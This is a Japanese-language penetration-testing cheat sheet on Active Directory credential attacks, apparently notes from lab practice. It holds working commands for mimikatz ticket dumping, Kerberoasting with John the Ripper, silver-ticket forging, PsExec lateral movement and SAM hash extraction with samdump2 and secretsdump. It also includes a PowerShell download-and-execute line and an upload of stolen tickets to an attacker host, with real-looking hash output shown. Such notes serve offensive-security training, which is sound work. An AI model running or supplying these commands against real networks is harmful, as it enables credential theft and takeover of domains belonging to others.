## Active Directory Authentication

### 認証情報の抽出(mimikatz)

### チケットの抽出(mimikatz)

```cmd
mimikatz # sekurlsa::tickets
```

### サービスチケットの要求

```powershell
PS C:\Users\Public> Add-Type -AssemblyName System.IdentityModel
PS C:\Users\Public> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/ExchangeService.xor.com'
```

### 現在のユーザにキャッシュされたkerberosチケットを表示

```cmd
klist
```

### サービスチケットのダウンロード

```cmd
mimikatz # privilege::debug
mimikatz # kerberos::list /export
```

### サービスチケットのクラック

サービスアカウントのNTLMやパスワードの取得ができる

チケットの配送(apacheを立ち上げておく）

```
powershell (New-Object System.Net.WebClient).uploadFile('http://192.168.45.187/upload.php', '4-40a10000-xor-app59$@XOR-APP59$-XOR.COM.kirbi')
```

```bash
ls /var/www/uploads/                                  
'4-40a10000-xor-app59$@XOR-APP59$-XOR.COM.kirbi'
```

#### kerberostを利用したクラック（遅いのでJohn the ripperのがいい）

```bash
python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 4-40a10000-xor-app59\$@XOR-APP59\$-XOR.COM.kirbi
```

#### John the ripperを利用したクラック

```bash
kirbi2john 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi -o crack_file
```

```bash
john --format=krb5tgs crack_file --wordlist=/usr/share/wordlists/rockyou.txt
```

#### Invoke-Kerberoust.ps1を利用したクラック

ドメイン内のすべてのサービスプリンシパル名を自動的に列挙し、それらのサービスチケットを要求し、John the RipperとHashcatの両方でクラックできる形式でそれらをエクスポートする

https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/

![image-20230220232006616](img/ActiveDirectory_auth/image-20230220232006616.png)

```cmd
powershell.exe IEX (New-object System.Net.Webclient).Downloadstring('http://192.168.45.187/Invoke-Kerberoast.ps1')
```

Hashの値すべてをコピーしサクラエディタで置換（タブと\r\n）してファイルを作成してJohn the ripperでパスワードクラックする

```bash
john --format=krb5tgs crack_file --wordlist=/usr/share/wordlists/rockyou.txt
```



### シルバーチケット

ドメインのSIDを取得する

```cmd
whoami /user

User Name               SID                                          
======================= =============================================
xor-app59\administrator S-1-5-21-3051798232-4248191986-2095020414-500
```

最後の-500を除いた部分がドメインを定義するSID

サービスチケットを作成する

```cmd
mimikatz # kerberos::golden /user:sqlServer /domain:xor.com /sid:S-1-5-21-3051798232-4248191986-2095020414 /target:xor-app23.xor.com:1433 /service:MSSQLSvc /rc4:9F32A1D1BD317B5B8E96DDE9186D8239 /ptt
```

横展開する（成功したことない）

```cmd
PsExec.exe -accepteula -u sqlServer \\xor-app23 cmd.exe
```



### SAMの取得（reg save)

参考サイト：https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry

* 管理者アカウントでsystemとsamを取得する

  ※おそらく整合性レベルHigh

  ```
  reg save hklm\system system
  reg save hklm\sam sam
  ```

* 取得した2ファイルをkaliに転送する

  ※systemは容量が大きいのでscpなどを使って転送するとよさそう

* ハッシュダンプする

  ```bash
  samdump2 system sam                                               
  
  ----
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  *disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  *disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  ```

  ※disableとついてると失敗？？

* 以下コマンドでもhashdump可能

  https://www.thehacker.recipes/ad/movement/ntlm/pth

  ```bash
  secretsdump.py -sam sam -system system LOCAL
  
  -----
  Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
  
  [*] Target system bootKey: 0x8083a99d1e5064d3bab801bc951c6fea
  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:97eb2768602642d58b10db2d26caff8a:::
  [*] Cleaning up...
  ```

  
